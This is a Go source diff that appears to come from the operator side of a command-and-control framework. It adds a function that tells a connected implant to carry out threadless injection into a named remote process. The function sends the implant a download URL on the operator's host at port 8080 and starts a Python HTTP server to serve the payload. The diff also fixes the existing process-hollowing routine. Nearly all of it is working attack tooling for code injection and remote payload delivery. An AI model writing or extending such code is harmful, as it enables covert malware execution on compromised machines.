@@ -296,6 +296,7 @@ func hollow(conn *net.Conn, filePathLocal string, filePathRemote string) {
 	bufferStr := string(bufferSnapped)
 	if bufferStr != "OK\n" {
 		fmt.Println("[-]Couldn't initiate Hollowing")
+		return
 	}
 	fmt.Println("[+]Signal was recieved and acknowledged")
 	//Write the remote path
@@ -365,5 +366,100 @@ func hollow(conn *net.Conn, filePathLocal string, filePathRemote string) {
 		return
 	}
 	fmt.Println("[+]Successful Proccess Hollowing !")
-	fmt.Println()
+}
+
+func threadless(conn *net.Conn, filePathLocal string, processRemoteName string) {
+	file, err := os.Stat(filePathLocal)
+	if err != nil {
+		fmt.Println("[-]Couldn't read the file on the local machine !")
+		return
+	}
+	//now we enter the threadless function
+	buffer := make([]byte, 100) //Fix buffer size later
+	fmt.Println("[*]Sending Signal ...")
+	(*conn).Write([]byte("threadless\n"))
+	read_len, err := (*conn).Read(buffer)
+	if err != nil {
+		fmt.Println("[-]Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 {
+		fmt.Println("[-]Error with length of Buffer")
+		return
+	}
+	bufferSnapped := buffer[:read_len]
+	bufferStr := string(bufferSnapped)
+	if bufferStr != "OK\n" {
+		fmt.Println("[-]Couldn't initiate Threadless Injection")
+		return
+	}
+	fmt.Println("[+]Signal was recieved and acknowledged")
+
+	//Write the remote process name
+	fmt.Println("[*]Writing the Remote Process Name ...")
+	(*conn).Write([]byte(processRemoteName))
+	read_len, err = (*conn).Read(buffer)
+	if err != nil {
+		fmt.Println("[-]Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 {
+		fmt.Println("[-]Error with length of buffer")
+		return
+	}
+	bufferSnapped = buffer[:read_len]
+	bufferStr = string(bufferSnapped)
+	if bufferStr != "OK\n" {
+		fmt.Println("[-]The Remote Process Does Not Exist")
+		fmt.Println()
+		return
+	}
+	fmt.Println("[+]The Remote Process is Running !")
+	//Send the entire URL instead
+	fileName := file.Name()
+	//Will pass a custom URL input by the user instead later
+	localAddress := (*conn).LocalAddr().String()
+	localIP := strings.Split(localAddress, ":")[0]
+	//Since we hard coded it to be 8080 the port we listen on we do the folowing
+	downloadURL := "http://" + localIP + ":8080/" + fileName
+	(*conn).Write([]byte(downloadURL))
+	read_len, err = (*conn).Read(buffer)
+	if err != nil {
+		fmt.Println("[-]Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 {
+		fmt.Println("[-]Error with length of buffer")
+		return
+	}
+	bufferSnapped = buffer[:read_len]
+	bufferStr = string(bufferSnapped)
+	if bufferStr != "OK\n" {
+		fmt.Println("[-]URL did not send")
+		return
+	}
+	//Improve this just by sending the whole download URL instead and doing this shit server side
+	fmt.Println("[+]Download URL sent successfully !")
+	fmt.Println("[*]Started python HTTP Server in Bushido dir")
+	fmt.Println("[!]Manually terminate the HTTP server after the client recieves the file !")
+	fmt.Println("[*]Waiting for hollowing to finish ...")
+	cmd := exec.Command("./scripts/pythonServer.sh")
+	cmd.Run()
+	// read_len, err = (*conn).Read(buffer)
+	// if err != nil {
+	// 	fmt.Println("[-]Error Reading From Buffer")
+	// 	return
+	// }
+	// if read_len <= 1 {
+	// 	fmt.Println("[-]Error with length of buffer")
+	// 	return
+	// }
+	// //(*conn).SetReadDeadline(10 * time.Second)
+	// bufferSnapped = buffer[:read_len]
+	// bufferStr = string(bufferSnapped)
+	// if bufferStr != "OK\n" {
+	// 	fmt.Println("[-]Something went wrong")
+	// 	return
+	// }
+	// fmt.Println("[+]Successful Proccess Hollowing !")
 }
